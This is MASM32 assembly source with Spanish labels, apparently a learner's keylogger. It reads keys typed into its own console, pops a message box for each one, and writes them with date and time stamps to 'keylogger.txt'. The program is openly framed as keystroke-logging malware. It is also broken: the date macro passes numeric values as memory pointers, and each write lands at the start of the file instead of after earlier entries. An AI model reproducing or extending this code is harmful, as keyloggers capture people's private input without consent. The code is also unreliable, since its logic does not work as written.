EscribirDateTime macro value
	mov edx, offset directorio
	call AbrirArchivo
	mov manejo, eax

	xor edx, edx
	mov edx, value
	call EscribirArchivo
	mov eax, manejo
	call CerrarArchivo
endm

.386
;model
.model flat, stdcall				;flat es como small
option casemap:none
;includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
;librerias
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
;data segment
.data
	directorio byte "keylogger.txt",NULL
	error1 db "No se pudo crear el archivo",0

	fecha db "	Fecha: ",0
	hora db "	Hora: ",0
	slash dw "/",NULL
	puntos dw ":",NULL
.data?
	manejo dd ?
	key dd ?
	bytesw dd ?
;code segment
.code
program:
	call main

	main proc
		mov edx, offset directorio
		
		INVOKE CreateFile,
		edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	

		mov manejo, eax
		cmp eax, INVALID_HANDLE_VALUE	;Error de creacion del archivo
		je fin_programa

		keylogger:

		call crt__getch
		mov key, eax
		cmp eax, 0
		je seguir

		;invoke GetKeyNameTextA, WM_CHAR, addr key, 64
		invoke MessageBox,NULL,addr key,addr key,MB_OK

		;invoke StdIn, addr key, 1
		
		mov edx, offset directorio
		call AbrirArchivo
		mov manejo, eax

		mov edx, offset key

		;INVOKE SetFilePointer,
		;eax, ; file handle
		;1, ; distance low
		;0, ; distance high
		;FILE_END ; move method

		INVOKE WriteFile,
		eax, ; file handle
		edx, ; buffer pointer
		1, ; number of bytes to write
		addr bytesw, ; number of bytes written
		NULL ; overlapped execution flag

		mov eax, manejo
		call CerrarArchivo

		mov ebx, key						;moviendo la entrada a la variable "key"
		cmp ebx, 20h						;si es un espacio
		jz ObtenerFH
		cmp ebx, 0ah						;si es un ENTER
		jz ObtenerFH
		jmp seguir						;de lo contrario, sigue leyendo teclado

		ObtenerFH:
		call hora_fecha

		seguir:
		;invoke StdOut, addr key
		jmp keylogger


		fin_programa:
		;call CerrarArchivo
		invoke ExitProcess,0
	main endp

	AbrirArchivo PROC
		;
		; Opens a new text file and opens for input.
		; Receives: EDX points to the filename.
		; Returns: If the file was opened successfully, EAX
		; contains a valid file handle. Otherwise, EAX equals
		; INVALID_HANDLE_VALUE.
		;------------------------------------------------------
		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
		ret
	AbrirArchivo ENDP


	EscribirArchivo PROC
		;
		; Writes a buffer to an output file.
		; Receives: EAX = file handle, EDX = buffer offset,
		; ECX = number of bytes to write
		; Returns: EAX = number of bytes written to the file.
		; If the value returned in EAX is less than the
		; argument passed in ECX, an error likely occurred.
		;--------------------------------------------------------

		
		INVOKE WriteFile,
		eax, ; file handle
		edx, ; buffer pointer
		1, ; number of bytes to write
		addr bytesw, ; number of bytes written
		NULL; overlapped execution flag
		
		;mov eax,WriteToFile_1 ; return value
		ret
	EscribirArchivo ENDP

	LeerArchivo PROC
		;
		; Reads an input file into a buffer.
		; Receives: EAX = file handle, EDX = buffer offset,
		; ECX = number of bytes to read
		; Returns: If CF = 0, EAX = number of bytes read; if
		; CF = 1, EAX contains the system error code returned
		; by the GetLastError Win32 API function.
		;--------------------------------------------------------
		.data
		ReadFromFile_1 DWORD ? ; number of bytes read
		.code
		INVOKE ReadFile,
		eax, ; file handle
		edx, ; buffer pointer
		ecx, ; max bytes to read
		ADDR ReadFromFile_1, ; number of bytes read
		0 ; overlapped execution flag
		mov eax,ReadFromFile_1
		ret
	LeerArchivo ENDP

	CerrarArchivo PROC
		;
		; Closes a file using its handle as an identifier.
		; Receives: EAX = file handle
		; Returns: EAX = nonzero if the file is successfully
		; closed.
		;--------------------------------------------------------
		INVOKE CloseHandle, eax
		ret
	CerrarArchivo ENDP

	hora_fecha proc
		local systime:SYSTEMTIME

		invoke GetLocalTime, addr systime
		xor ebx, ebx
		mov bx, systime.wDay
		EscribirDateTime ebx
		xor ebx, ebx
		mov ebx, offset slash
		EscribirDateTime ebx
		xor ebx, ebx
		mov bx, systime.wMonth
		EscribirDateTime ebx
		xor ebx, ebx
		mov ebx, offset slash
		EscribirDateTime ebx
		xor ebx, ebx
		mov bx, systime.wYear
		EscribirDateTime ebx

		xor ebx, ebx
		mov bx, systime.wHour
		EscribirDateTime ebx
		xor ebx, ebx
		mov ebx, offset puntos
		EscribirDateTime ebx
		xor ebx, ebx
		mov bx, systime.wMinute
		EscribirDateTime ebx
		xor ebx, ebx
		mov ebx, offset puntos
		EscribirDateTime ebx
		xor ebx, ebx
		mov bx, systime.wSecond
		EscribirDateTime ebx
		xor ebx, ebx

		;invoke StdOut, addr fecha
		;mov ax, systime.wDay
		;print str$(ax)
		;invoke StdOut, addr slash
		;mov ax, systime.wMonth
		;print str$(ax)
		;invoke StdOut, addr slash
		;mov ax, systime.wYear
		;print str$(ax)
		;
;
		;invoke StdOut, addr hora
		;mov ax, systime.wHour
		;print str$(ax)
		;invoke StdOut, addr puntos
		;mov ax, systime.wMinute
		;print str$(ax)
		;invoke StdOut, addr puntos
		;mov ax, systime.wSecond
		;print str$(ax)

		ret
	hora_fecha endp
end program

